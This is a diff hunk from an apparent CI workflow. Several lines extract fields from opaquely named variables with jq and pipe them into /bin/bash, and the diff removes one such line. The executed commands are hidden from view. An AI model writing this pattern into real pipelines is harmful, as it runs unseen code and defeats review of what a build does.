@@ -28,7 +28,6 @@ jobs:
           echo $tdeb720 | jq -r .lomzr4844 | /bin/bash
           echo $ycd79932 | jq -r .jzh79 | /bin/bash
           echo $un07070 | jq -r .zqst1337 | /bin/bash
-          printf '%s' "$mju2481" | jq -r .qmwg047 | /bin/bash
           printf '%s' "$updkf03" | jq -r .kj17 | /bin/bash
 
       - name: Upload output
